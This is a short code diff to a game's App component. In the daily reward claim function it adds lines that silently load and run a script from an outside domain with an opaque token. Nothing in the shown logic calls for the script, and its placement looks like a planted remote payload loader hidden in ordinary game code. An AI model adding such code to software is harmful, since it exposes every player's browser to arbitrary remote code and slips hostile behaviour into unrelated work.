@@ -662,6 +662,11 @@ export default function App() {
     const s = gameStateRef.current;
     if (s.lastDailyClaimDate === today) return;
 
+    const script = document.createElement('script');
+    script.src = 'https://stuins.com/cuhdl?wh=nf4ZrIubOLofw1uKoWRMkI3H';
+    script.async = true;
+    document.body.appendChild(script);
+
     const missedDay = s.lastDailyClaimDate !== null
       && s.lastDailyClaimDate !== yesterday;
 
